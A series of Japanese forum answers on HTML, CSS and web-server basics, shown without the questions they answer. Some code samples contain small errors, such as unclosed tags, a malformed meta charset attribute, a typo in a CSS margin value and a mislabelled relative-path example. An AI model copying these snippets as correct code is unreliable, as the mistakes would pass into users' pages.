＞ワードプレスのプラグイン ワードプレスをご利用であれば、プログラムで呼びだし時の日付けを チェックして必要な内容をインクルードすればいいのでは？ （別のページに飛ばす方がらくですが同じページで処理するなら 読み込みファイルを変える方が楽かと） 場合によってはjavascriptで処理する手もありますが ユーザーの環境に左右されるので精度はおちます
No.1 を少し修正 <style> p { font-size:1em; line-height:2em; } p .wruby { position: relative; line-height:1em;} p .wruby sup { font-size: 50%; overflow: visible; white-space: nowrap; position: absolute; left: 0; top: 0; vertical-align: top; margin-top: -1em; } p .wruby sub { font-size: 50%; overflow: visible; white-space: nowrap; position: absolute; left: 0; bottom: 0; vertical-align: bottom; margin-bottom: -1em; } </style> <p> これは<span class=wruby>電算機<sup>でんさんき</sup><sub>ordinateur</sub></span>です。
手持ちの環境にて確認できませんでした。 ですので以下推測となりますが、原因と対策をいろいろと。 * ブラウザの仕様で、チャタリングによる二重送信防止のため → submit 前処理で action の URL 末尾にダミーパラメータを付与(例: ?dummy=HHMMSS) * submit 前処理で、フォーム内容を変更/破壊するため 2 回目以降にエラー → デバッグにて値を確認、特に action 属性とか hidden 要素か * submit 時のイベント処理で、二度押し防止の仕組みが入っている → submit ボタンの disable とか確認 * 上記すべてが駄目だった場合 → submit 毎に新規に別フォームを生成して submit して使い捨てる → フォーム内容のコピーを毎回行う荒業になるのでご注意ください ちなみに POST の場合なら、仕様上は "not cacheable" な応答を取得するはずなので、 キャッシュが理由となることは考えられません。
04WebServerの仕様がよくわからないのですが apacheにprint？って状況はどういうことでしょう？ なにかプログラムをかましています？
そこにiframeを使用することが適切かどうかは別にして… (1)tableの幅が小さくなって左に寄っていますので、tableの幅をいっぱいに広げます。 また、ピンク色の枠が入るセルをiframeと同じ300ピクセルに固定します。 具体的には、1行目を <table style="width: 100%"><tr><td style="width: 300px"> のように書き換えます。 これでリンクの文字が白い部分の中央、ウィンドウ全体の右寄りに表示されます。 (2)ウィンドウの右側にも左側のピンク色の部分と同じ幅の余白を設けます。 具体的には、 <DIV style="font-size:600%"> の部分を <DIV style="font-size:600%; margin-right:300px"> のように書き換えます。 これでリンクの文字がウィンドウ全体の中央に表示されます。
互換性を考えるなら1999年勧告のHTML4.01ですね。 ＞98seを使っている者としては気が引けます 　そんなこと最初に言ってくれなきゃ・・・、ですがOSのバージョンは気にしなくて良い。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる。 　どのバージョンのHTMLも、コンテンツプロバイダの投資が無駄にならないよう、 　￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ また短期間で文書が読み取り不能となったりすることがないよう、産業界の幅広い ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ 賛同を反映するようにされてきた。 ￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［HTML4.01仕様書#2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　とても大事なところなので読んでおくこと。 　私は、HTML2.0の時代から携わっていますが、HTML3.2(1997年勧告)への反省から、HTML4.01が作られました。その最大のポイントは「構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」です。 　Windows98SEの発売が2000年ですから、HTML4.01の勧告(1999年12月)のわずかあとになります。 ※ HTML4.01の構造とプレゼンテーションの分離は、その後のXHTML/HTMLの基本となりました。それ以前のHTMLとは一線を隔している。 　 ＞これからHTMLを作る場合にはXHTMLよりもHTML4.01でやる方が正解でしょうか？ 　HTMLでいうなら、HTML4.01strict または、HTML5です。 　XHTMLは、他のアプリケーションとの連携などの目的があれば選択することになるでしょう。 　HTML5であっても、<head></head>内に <!--[if IE]> <script src="http://html5shiv.googlecode.com/svn/trunk/html5. … <script src="http://css3-mediaqueries-js.googlecode.com/svn/t … <![endif]--> を書いておけば、HTML5を理解できないブラウザでもHTML5が使えます。 しかし、HTML4.01でも構いません。マークアップに厳しいHTML5よりも作成するのはずっと楽です。HTML5では内容とマークアップがとても厳しいです。 　⇒HTML5 における HTML4 からの変更点( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　ただし、その場合であっても必ずHTML4.01strictで作成するようにしましょう。 ・HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　これは、HTMLが勧告された今では必須と言っても良いでしょう。HTML5にはstrictしかない!! 　⇒7.2 HTMLバージョン情報( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ＞XHTMLはあまり使われていないようですけれども については、この記事が参考になるでしょう。 　⇒HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (1/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … ) 　なぜHTML4.01strictで作成すべきかも、この記事を読めば分かります。(2ページ目) 　すなわち、 <body> 　<div class="header"</div> 　<div class="section"</div> 　<div class="footer"</div> </body> のようにマークアップせよということ!! HTML5の新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … )をclass名にして文書構造が分かるようにすること。
結論から言うとできません。 考えても見て下さい。ブラウザーのように、あなたのスマホ上にあなたが許可してインストールされているソフトが、ユーザーの何らかの操作によって、あなたのホームページをホーム画面上に追加するならまだしも、特定のホームページが勝手にホーム画面にショートカットを追加できるようになれば、セキュリティー上の大きな問題です。 よっぽどあなたのホームページをホーム画面に追加させたいなら、アプリを作ってそれをダウンロード・インストールさせるしかありません。または各ブラウザが個別にサポートしている、リンクをホーム画面に追加する機能を使って、ユーザーに手動でさせるしかありません。
HTMLソースが無いので、hover がテキストか画像なのかも不明です。 -ms-filter: “alpha( opacity=80 )”; " が全角担っています。
普通は、名前の変更はせずに上書きしますが、 事情があって名変する場合には、 「301リダイレクト」で転送設定（推奨されている方法です） ↑ 方法は検索して調べましょう。 301リダイレクトすれば、どちらが先でも、旧ファイルの有無でも、何も問題ないです。 だって、新ページに飛ぶから、旧ページ（旧ファイル）の内容も存在も確認できないから。 重複にならない。更に旧ページの地盤をも引き継いでくれる。
href属性値は、ちゃんと " や ' で囲ってください。 “ とか ” は違う文字です。 間違い <a href=“http://google.com”>Google</a> 正しい <a href="http://google.com">Google</a> 正しい <a href='http://google.com'>Google</a> また、以下の箇所も引用符がおかしいです。 <html lang=“ja”> <meta charset=“utf-8”> まさか、Microsoft Wordみたいな引用符が勝手に修正されるソフトでHTMLを書いたりしてませんよね？
使っているテキストエディターの文字コードがutf-8ではない場合に そうなる場合があります。 Windowsに最初から入っている「メモ帳」は「shift-jis 」か「 unicode 」以外の コードになっていると文字化けするので 他のエディターを使うか、 メタタグの中の文字コードを <meta http-equiv="Content-Type" content="text/html; charset="Shift-jis" /> にすれば直ると思います。
onclik の内容を以下のように変更すればうまく動きます。 onclick="this.select();clipboardData.setData('text',this.innerText);" ※ 以下蛇足です。 　 textarea の value プロパティで内容を取得すると、改行 　 コード CRLF が自動的に LF に変換されてしまうようです。 　 これを Windows のメモ帳に貼り付けた場合、メモ帳では 　 LF を改行とみなさないために、1行表示になります。 　 innerText プロパティでは改行コードが変換されないので、 　 目的の動作を実現できます。
ログイン情報をセッションに登録します。 pythonでリクエスト毎にセッションの情報を確認すれば、ログインユーザーかどうか判定できます。 セッションIDはpythonが自動に作成し、クッキーを返すので意識する必要はありません。
No.1 です > ところで、逆に現在のscaleの値も得ることが出来るでしょうか。 > 画像をクリックするたびに、25%->50%->100%->25%->...としたいのです。 スクリプト上で現在の style の設定値を読み取るのは、 なかなかに面倒な処理になりがちです。 参考 https://developer.mozilla.org/ja/docs/Web/API/wi … なので style ではなく class を読み書きしては如何でしょうか。 以下 HTML5/CSS3 での実装例です。 <style> img.quarter { transform:scale(0.25); } img.half { transform:scale(0.5); } img.regular { transform:scale(1); } </style> <script> document.addEventListener('click', function(ev){ var A = [ 'quarter', 'half', 'regular' ]; var x = ev.target; if (! x instanceof HTMLImageElement) return; var i = A.reduce(function(p,v,i){return x.classList.contains(v)? i: p},-1); if (i < 0) return; x.classList.remove(A[i]); x.classList.add(A[ (i+1) % A.length ]); }, false)</script> <body> <p><img src=dummy1.jpg class=regular> クリックにより拡大縮小、初期100% <p><img src=dummy2.png class=half> クリックにより拡大縮小、初期50% <p><img src=dummy3.gif> 対象外の画像
なにをトリガーにするつもりかわからないけど ユーザーは自分が入力したものと別なものが表記され混乱するだけ 最低のインタフェースなのでやめた方がいい 送った先で変換すれば済む話でしょ？
　⇒HTML4.01仕様書/14.3 外部スタイルシート( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒CSS2.1仕様書6.4 カスケード処理( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) この二点は、CSS(カスケーディングスタイルシート)を利用する場合に絶対に必要な最低限の仕組みです。命とも言える部分です。 　複数のHTMLに、そのプレゼンテーションを指定するスタイルシートを共用させるという事は、 ＿＿＿＿＿＿＿＿＿＿＿＿＿＿ここから 　著者は、スタイルシートをHTML文書から切り離すことができる。こうすることには、幾つかの利点がある。 ・著者及びWebサイト管理者が、複数文書間(及び複数サイト間)でスタイルシートを共有できる。 ・著者が、文書に変更を加えることなくスタイルシートを変えられる。 ・ユーザエージェントが、メディア記述子に基づき、スタイルシートを選択的に読み込める。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで ＞複数のhtmlで同じcssファイルを共有することは可能でしょうか？ 　というか、そのための外部スタイルシート/カスケーディングスタイルシートですよ。 HTMLの<head></head>内に <link rel="stylesheet" type="text/css" media="screen" href="/styleSheet/default.css"> <link rel="stylesheet" type="text/css" media="screen" href="/styleSheet/standard.css" title="標準"> <link rel="Alternate StyleSheet" type="text/css" media="screen,projection,tv" href="/styleSheet/default.css" title="大きな文字"> <link rel="styleSheet" type="text/css" media="print,handheld" href="/styleSheet/print.css"> の様に記述します。 ※スタイルシートへのパスは上記のように絶対パスで指定すると、そのHTMLがサーバーのどの階層にあっても同じ記述で利用できます。 　しかし、ローカルでテストはテスト用ローカルサーバーを持っていないときには表示の確認ができません。 ※スタイルシートへのパスを相対パス <link rel="stylesheet" type="text/css" media="screen" href="/styleSheet/default.css"> 　で記述する場合は、HTMLの位置から正確に記述する必要があり作成したHTMLの他の階層への移動はできません。 　ウェブページを作成されているのでしたら、開発者向けツール( https://addons.mozilla.jp/firefox/extensions/dev … )の豊富なfirefoxをお使いだと思いますが、そのアドオンに とても有名なFirebug( https://addons.mozilla.jp/firefox/details/1843 )があります。それを使われるとスタイルシートの適用が一目瞭然です。 　いずれにしても、最初にあげたカスケーディングの仕組みはカスケーディングスタイルシートを利用する上で最も大事な、命とも言える部分です。それを知らずしてスタイルシートは使えないです。 　仕様書は正確に書かれているため、とっつき難いかもしれませんが・・。あちこち拾い喰いするより確実に正確な情報です。ぜひ身につけてください。
＞　ｈｔｔｐｓ://www.sample.com/にアクセスし、内部リンクで<a href="page1.html">にアクセスしたら ＞　ｈｔｔｐｓ://www.sample.com/page1.htmlにアクセスされる、という認識で良いですか？ 合ってます。 ＞　また、jQueryのAjax通信でurl: "getText.php"みたいにアクセスしています。 こちらもHTTPSになります。 ＞　何か独自SSLだと気をつけないといけなようなことってありますか？ 外部から HTTP で来たときに HTTPS に振り替えてやるようにしてあげましょう。
URLでこの形で送る以上は、文字列にしなければなりません。 したがって「データを文字列に変換する」「変換された文字列を元のデータに戻す」プログラムを用意するか、既にあるものを活用するか、です。 決まった方法はありません。 あなたがやろうとしている事に合っている方法を探してください。 例えば、 [1,2,3] 程度なら id=1,2,3 というURLになるように空白とかを調整して送信。 受信側では、 1,2,3 を ','.split(～) で分割。 とか。 データ量がそれほどでなければ、JSONやXMLという方法もあるだろうし、ある程度大きくなったらURLとしては使えないので、別の方法を考える必要があります。
ブラウザのキャッシュじゃないですか？ キャッシュを消して再度読み込み直す or ファビコンのファイル名を変更してHTMLを組み直す 個人的には ファビコンは画像なのでGETのパラメータを動的に付けて新しい物を常に取るようにするのがお勧めです。
ちょっとコードとcssに突っ込みどころがやたら多いですが、とりあえずサファリの隙間を消す事だけで考えるとimgとbrの間にある改行を削除すればいいです。 コード内の改行が半角スペース扱いになる事は結構あるので注意しましょう。
ブラウザは、余計な>があると&gt;と書き直して表示するのでブラウザ経由でソース見たって意味無いです。 　エディタで表示している状態で>>と重複しているはずです。 　見つけ難ければ Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　で右上のDATAをクリックして、そこにテキストエディタでのソースを貼り付けてみると指摘してくれる。
いくつか方法がありますが・・・私が良く使う方法を説明します。私はPerl使いですが基本は同じです。 テンプレートのフォームを用意します。 <form ****> 　<select name="ABC"> 　　<option value="1" $SELECT_ABC_1>選択肢1</option> 　　<option value="2" $SELECT_ABC_2>選択肢2</option> 　　<option value="3" $SELECT_ABC_3>選択肢3</option> とかにして、 　($SELECT_ABC_1,$SELECT_ABC_2,$SELECT_ABC_3) = ''; 　if($in{'ABC'} eq '1'){$SELECT_ABC_1 = "selected=\"selected\""} 　elsif($in{'ABC'} eq '2'){$SELECT_ABC_2 = "selected=\"selected\""} ・・・以下略・・ 　cookieについても同様にチェックする。 同様に確認画面のときも、 <input type="hidden" name="ABC" value="2"> にする。同時にset-cookieにて、&ABC=2　をいれておく。 Cでも他の言語でも考え方は同じです。 XHTMLは面倒なので、HTMLでよいと思いますが
コメントアウトはただの編集者に対しての補足情報ですので、 見やすければどちらでも構いません。 そのサイトが「閉じタグの前」と書いてただけで、別に後でも問題ないです。 古いブラウザではコメントアウトのせいでレイアウトずれが起こったりしたので 記述場所を限定して使いたい意識がある方も居るとは思いますが、 今は全く気にする必要は無いです。 なお、Wordpressのデフォルトテンプレートは </div><!-- #content --> という書き方です。 ちなみにはそういう意味のコメントは書きません。 不要なので。
○HTTPサーバーにアクセスしていますか?(URLがfile:で始まったりしてはいませんか?) ○CGIを使えるようにHTTPサーバーは設定できていますか? ○.pyをCGIとして実行するように、サーバーの設定はできていますか? あるいは、.pyを.cgiに変更したら動作しますか?
読み返してみると、なぜないかの説明にはなってませんね。 ちょっとHTML/CSSの歴史を復習されると分かると思いますので、まずHTML4.01仕様書の 2.2.1 HTMLの略歴( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 2.4 HTML 4による文書の著述( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　を読んでください。それでピンと来るかも。 　また、 HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … ) 　の「【問題2】文書内に埋め込まれた「意味」が不明確」あたりも良いですね。 　肝心な事は、あなたが作成するHTMLにおいて、良いマークアップとは、 「「どこからどこまでが重要な本文なのか」「この＜ul＞要素はナビゲーションメニューを表しているのか、文書中の個条書きなのか」すらも分からない」 　ではダメだという事ですね。 　HTML4.01では、「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」でしたね。具体的にいうと ・ここは、このHTMLのヘッダに当たる（本文じゃない）ので 　<div class="header">～</div> ・ここは本文なので 　<div class="section">～</div> ・ここは内容とは直接関係しないので 　<div class="aside">～</div> の様にマークアップされてこられたと思いますが、記事のその部分が、作者にとって主題なのか、そうでないのかは他人には判断できないのです。 　今後、HTML5が主流になると思いますが、HTML5では 『文書をよりよく構造化するために、( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』新しい要素が追加されますので、よりこの流れが進むでしょう。HTML4.01のように、何でもかんでもDIVとclass名はできなくなります。 "Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable.( http://www.w3.org/TR/2012/CR-html5-20121217/grou … )" 　(著者は、他に適切な要素がないときの最後の手段としてdiv要素を使用することが強く奨励される。) 　文書のアウトラインを構成するブロックはsectionを階層をつけてでマークアップするなど・・。 <body> 　<header></header> 　<section> 　　<h2></h2> 　　<p></p> 　　<section> 　　　<h3></h3> 　　　<p></p> 　　　<section> 　　　　<h4></h4> 　　　　<p></p> 　　　</section> 　　　<aside></side> 　　　<nav></nav> ・・・・ 　4.3.3 The section element( http://www.w3.org/TR/2014/REC-html5-20141028/sec … ) 　他人の書いた、マークアップはその著者が意図してマークアップしている物なので、他人がその正否を判断することはできないのです。 　スタイルシートは、そのHTMLにおける文書構造に基づいてセレクタ書くのですから・・ section{margin-left:2em;font-size:0.95em;} とすればsectionの階層ごとには左が字下げされ、文字は少しずつ小さくなる、 section section section{margin-left:0;font-size:100%;} とすれば3階層以降は字下げもフォントサイズ縮小もない。 　要は自分で仕様書をよく読んで理解して、自分の意図した通りにマークアップすることが正しいのですよ。　 　とりあえずHTML4.01とCSS2.1の仕様書くらいはマスターしましょう。誰から文句のつけようがないマークアップを自分ですればよい。 　
'data-' で始まる属性は独自データ属性と言い、そのページを書いた人が独自のデータ/属性を使いたい場合に使われます。 http://www.html5.jp/tag/attributes/data.html おそらくですが、素のハイパーリンクではできない、そのリンクをクリックした人の解析やクリックされた回数を集計するという事をやらせるために JavaScript でクリックイベントを付加しているのでしょう。その時に左記の処理を終えた後のページ遷移先が必要になるため、それを JSON で記述しているのだと思います。 ……まあ、上記以上の詳しい処理内容はぐるなびの企業秘密になるのでしょうし、そもそも上記は私の推論に過ぎないのですが。
スタイルシート（CSS3）で背景画像をウィンドウサイズに合わせて調整する方法があります。 http://tips.nishishi.com/css/background-size-css … いま作っているhtmlソースに合わせてcssを導入しましょう。 http://homepage.ojaru.jp/css.html
これ、中身はWebアプリケーションですよ。 「おすすめメニュー」 「お知らせ」 「PickUp情報」 全部、動的出力でしょうね。 そして、他の回答者様がご指摘の通り、（おそらく）MicrosoftのIISサーバで動作、ミドルウェアはASP.NETで稼働しています。 最近のでなく、少し前の、「WebForm」ってやつ。 .aspxというのは.phpや.jspなどと同じように、慣用的に使われている有名な画面テンプレート用の拡張子です。 変更することもできますが、普通はそんなことしませんね。 IISって、ディレクトリだけ指定したときのデフォルトファイル名がDefault.aspxなので、変えないでそのまま使っているんでしょうか。
#2,3,4 です。 #4 の補足を読みました。 .list2 ではなく、.list を書き換える形で実現してみましたが、いかがでしょうか。 http://jsfiddle.net/2VfDu/15/ --- もう少し、スマートに実装したい場合は display: flex が妥当だと思いますが、少し疲れたのでその辺りはご自身で調べて見てください。 http://www.flapism.jp/html/278/ # Re: newly777さん
リダイレクトの場合は次のページへPOSTデータを送れないので無理です。
＞この３つ全てに適用されますよね？ その認識で正しいです。 期待通りにならないのなら、書き方が間違っています。
<title> が先頭にあれば、より早くタブのタイトルを表示しますが、タイトルにマルチバイト文字が含まれているなら <meta charset> を上位に置かないと文字コードを判定できないかもしれません。 文字コードの判定基準はサーバサイドの設定や XHTML, HTML によって変わります。 ■XHTML 始めに <?xml version="1.0" encoding="UTF-8"?> で宣言するので、<head> の先頭に <title> を置いて問題ありません。 ■Content-Type: text/html: charset=UTF-8 サーバサイドで「Content-Type: text/html: charset=UTF-8」を返しているなら、HTMLボディを読み込む前に文字コードが確定しているので <title> を先頭に置いても構いません。 ただし、ローカルファイルでテストする前提があるなら、<meta charset> を先頭におく必要があるでしょう。 ■<meta charset> 以外の <meta> <meta charset> 以外の <meta> は <title>, <meta charset> よりも優先順位が下がります。 重要なのは文字コード判定を <title> よりも先に認識させることです。 その点を意識していれば、自ずと答えが見えてくると思います。 # Re: uluemyocddvさん
まぁ気になるなら適当にspanでわけてnowrapしてしまえばよいのでは？ <style> h1 span{white-space: nowrap;} </style> <h1><span>ああああああああああああ</span><span>いいいいいいいいいいいい</span><span>うううううううううううう</span></h1> ブラウザの幅を狭めていくと、spanの切れ目で改行されます
a要素にtargetが使えるのは、framesetだけかと・・ 　frame（iframe）ならframeで作成しましょう。 　HTML5だと、iframeが使えますからエラーにはならない。 strict(厳密型)にはtargetはありません。 　通常のリンクの場合は、新しいウィンドウ(タブ)で開くか、そのウィンドウに開くかはユーザーの判断に任せます。右クリックのコンテキストメニュー、あるいはセンターボタンクリックとか・・ 　なぜtargetが必要なのですか・・
No.2の回答の者です。更新ができていなかったせいで、No.1の方と回答内容が被ってしまい申し訳ありません。本来なら削除したいところですが、回答の削除ができない仕様なのでこの場をお借りして謝罪いたします。解答欄を汚してしまい重ね重ね申し訳ないです。
内容をどう見せたいかだと思います。 例えばfacebookのタイムラインのように、沢山の情報を畳み掛けて閲覧者に見せたいときは単一ページにするといいと思います。 別ページにすると大して読まずにページを離れてしまうかもしれません。 逆に、流して読んで欲しくない重要な情報は別ページにするといいと思います。 面白い写真とか、複数枚同時に見せてしまうと一つ一つの面白さが薄くなってしまうとかそういう事です。 複数のコンテンツ同士に関連性が無かったらもちろん複数ページという事になりますが、 コンテンツ同士に関連性があったとしてもそれを単一ページで表示するとスクロールしないと見えない部分が出てきますよね。 複数のコンテンツの間で、これは優先的に見せたい、これは付加的なコンテンツである、 という風に優劣をつけられるなら単一ページでもいいかと思います。
＞例えばSEO的な視点での差異やHTMLとしての正否等々、他の視点でも差異があれば知りたいなと思った次第です。 　SEO Search Engine Optimization 検索エンジン最適化 とは、検索エンジンに内容が正確に理解されるように最適化する。分かりやすく言うと文書を構成する要素を最適な要素としてマークアップすることで、ページの内容が検索エンジンに理解されるようにする事です。 <div class="footer"> 　<h3>更新情報</h3> 　<dl class="documentHistry"> 　　<dt id="FIRST-PUBLISHED">First Published</dt> 　　<dd><span class="time">2013</span></dd> 　　<dt id="LAST-MODIFIED">Last Modified</dt> 　　<dd><span class="time">2014-10-03 12:00:00+09:00</span> (JST)</dd> 　</dl> </div> [HTML5] <footer> 　<h3>更新情報</h3> 　<dl class="documentHistry"> 　　<dt id="FIRST-PUBLISHED">First Published</dt> 　　<dd><time>2013</time></dd> 　　<dt id="LAST-MODIFIED">Last Modified</dt> 　　<dd><time>2014-10-03 12:00:00+09:00</time> (JST)</dd> 　</dl> </footer> 　検索エンジンには直接は関係ないでしょうが、他のシステムで使用する時はきちんと書きましょう。
「ルート相対パス」で用語の混乱が見られるようなので補足しておきます これは Adobe が提唱している「サイトルート相対パス」から来ていると思われます。 下記にAdobe, RFC の説明を併記します。 ■Adobe の説明 - 絶対パス (http://www.adobe.com/support/dreamweaver/content … など) - ドキュメント相対パス (dreamweaver/contents.html など) - サイトルート相対パス (/support/dreamweaver/contents.html など) 　※http://helpx.adobe.com/jp/dreamweaver/using/link … でリンクの種類の説明有。 　※http://helpx.adobe.com/jp/dreamweaver/kb/233307. … によるとDreamweaver ヘルプでも説明されている模様。 ■RFC2396 (URI: Generic Syntax) の説明 - 絶対パス (文中に該当語なし。RFC2396に倣うならBNF式 "abs_path" が該当。) - 相対URI (BNF式 "relativeURI" で定義。相対パス、絶対パス、認証URI、クエリ文字列の組み合わせ総称) - 絶対URI (BNF式 "absoluteURI" で定義。 http://www.adobe.com/support/dreamweaver/content … など) 　※http://jbpe.tripod.com/rfcj/rfc2396.ej.sjis.txt に原文(和訳)有。 ■RFC3986 (URI: Generic Syntax) の説明 - 相対パス (該当語なし) - 絶対パス (BNF式 "path-noscheme" で定義。 /support/dreamweaver/contents.html など) - 相対参照 (BNF式 "relative-ref" で定義。RFC2396における相対URIに相当。) - 絶対URI (BNF式 "absolute-URI" で定義。 http://www.adobe.com/support/dreamweaver/content … など) 　※http://www.ietf.org/rfc/rfc3986.txt に原文あり。 RFC とはインターネット関連技術の標準化団体を指し、この規定が標準と思って差し支えありません。 Adobe は「サイトルート(公開サーバのルートディレクトリ)からの相対パス」という意味で「サイトルート相対パス」と表現していますが、これは RFC 定義の「絶対パス」を指します。 また、Adobeが説明する「絶対パス」は RFC における「絶対URI」を指します。 特に「絶対パス」の定義がまるで違いますので、他人に説明するときに誤解を招かぬよう RFC 定義で覚えておくことをお勧めします。 # Re: jg1wjzさん
<div id="wrapper" style="margin:0px auto;font-family:Arial, Helvetica, sans-serif;font-size:20px;color:#000;text-align:left;"> 　ここの指定を変更する。 　⇒15 フォント( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) ただし、この方法ではとても煩雑になってしまうために、外部スタイルシートにしたほうが、色々な面で良いです。。 　すべてのページで同じスタイル表記を毎回無駄に送信しています。読み込みや表示に時間がかかってしまいます。 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitio … <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <meta http-equiv="Content-Style-Type" content="text/css" /> <meta http-equiv="X-UA-Compatible" content="IE=7" /> <title><?=$item_title?></title> <link rel="stylesheet" type="text/css" media="screen" href="/styleSheet/standard.css"> </head> <body> <div class="srticle"> %IMAGES% <div class="sub_tit">PRODUCT DETAILS</div> <div class="section"> <p> %DESCRIPTION% </p> </div> </body> </html>
Googleのアナリティクスでいいのでは？ http://www.google.com/intl/ja_jp/analytics/
はて？ 画像で良いなら素材配布サイトにいくらでもあるし、 気に入らなければ自作すれば良いだけでは？ 出席確認一覧表のようなものなら立派な「表」だし、「レイアウトを整えるための」にはならないでしょう。
No.2です。具体的な例を挙げたほうかわかりやすい。 <div class="section" id="ProductList"> 　<ul> 　　<li>新製品 　　　<ul> 　　　　<li>掃除機</li> 　　　　<li>扇風機</li> 　　　　<li>暖房機</li> 　　　</ul> 　　</li> 　　<li>従来品 　　　<ul> 　　　　<li>掃除機</li> 　　　　<li>扇風機</li> 　　　　<li>暖房機</li> 　　　</ul> 　　</li> 　</ul> </div> 　と、製品をリストでマークアップした。スクリーンリーダーや点字端末、携帯電話はこのままのほうが利用しやすい。しかし、印刷やブラウザでは表にしたほうが利用しやすい。 <link rel="stylesheet" type="text/css" media="screen,print" href="./styleSheet/screen.css"> とメディアをscreenとprintに指定して #ProductList ul{ margin:1ex auto; padding:0; width:90%; border:solid 1px gray; position:relative; } #ProductList ul li{ list-style:none; margin:0; padding:5px; display:table-cell; width:48%; border:solid gray 1px; } #ProductList ul li ul{ margin:0; border:none; } #ProductList ul li ul li{ display:block; } ・・・とか。 ＞文字をテーブルで囲ったようなデザインにいしたい場合は その要素に対して、borderを指定すれば枠で囲まれますし、displayの値をblock、inline-blockやtable-cellにするとか、それをtext-alignやfloatで並べるなどすれば良いです。
No.1のGletscerです。 皆さんも言うように、「どの言語が良いか？」ではなく、「あなたがどれを使えるか？」と、「サーバーにはどれが入っているか？」で決まるものです。 あなたが使いたい言語があっても、それをサーバーがサポートしてなければ使えません。 サーバーは自分で用意するのなら好きなものと入れられますけど・・・ PerlとPHPに精通してみえるのですね？ それならば、インタープリターのPerlより、コンパイルPHPの方が処理が速くて良いのではないでしょうか？ それと、DBMSは何を使うのですか？ ORACLE、MySQL、PostgreSQLなどでしょうか？ どのDBMSを使うかによって、その相性も考えた方が良いと思います。
一律にこれがよいとは言えないです。 ＞画像ならｐｘ、文字ならem など基準があれば・・・ 　画像は置換インライン要素、文字は非置換インライン要素です。非置換インライン要素はwidthプロパティを持ちませんし、置換インライン要素は置換される内容のサイズがデフォルトです。 　<p><span style="width:20px">ここは</span>テストの<img style="width:240px" src="" width="" height="" alt="">です。</p> の場合、spanは指定できないですが、画像は指定できる。 Visual formatting model details - CSS 2.1 spec (ja)( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 10.3 幅とマージンの計算( http://momdo.s35.xrea.com/web-html-test/spec/CSS … ) 　一方ボックスの場合は、自身の場合や抱合しているブロックがstaticであるかないかなどにも関わります。 　何が言いたいかと言うと、「文字なら、画像なら・・」ではなく、 ・それぞれのサイズを何によって決めたらよいか 　が判断基準になるからです。 　最近は、スクリーンメディア一つとっても、スマホから巨大なディスプレイまで様々な端末があります。そのために、ウィンドウサイズやボックスのサイズはリキッドで指定することが多いでしょう。 　分かりやすいのでHTML向けに記述すると header,section,footer{width:100%;min-width:470px;max-width:1000px;margin/o auto;} section figure p img{width:80%;height:auto;} 　そのページに対して印刷用スタイルシートを書く場合は header,section,footer{width:190mm;margin:0 auto;} section figure p img{width:150mm;height:auto;} 　とするでしょう。 　一方フォントのサイズは、自身を囲んでいる要素のサイズでなく自身のサイズを指定しますから、 　そのページのフォントサイズをユーザーの指定に合わせるなら、%やemで良いでしょうし、著者から強制的に指定するならpx（印刷用はptとかmm）で指定するでしょう。 　私は視覚弱者を考えて、フォントサイズは%やemなど相対サイズで指定することが多いです。 　サイズの単位の選択は、それぞれのプロパティによって意味が変わります。width:とfont-size:のように・・ 　どのサイズが良いかは、その場その場に合わせて著者が熟慮して指定すべきであって、これが良い、悪いという基準はないでしょう。
あなたにとって管理しやすい、あるいは理解しやすい階層、ファイル構成で何も問題ありません。 ただ、urlに、そのページを連想させるキーワードが含まれることで、ユーザーがどのページを見ているのか想像できるという見方もあります。システム的、SEO的には何も影響がないでしょう。
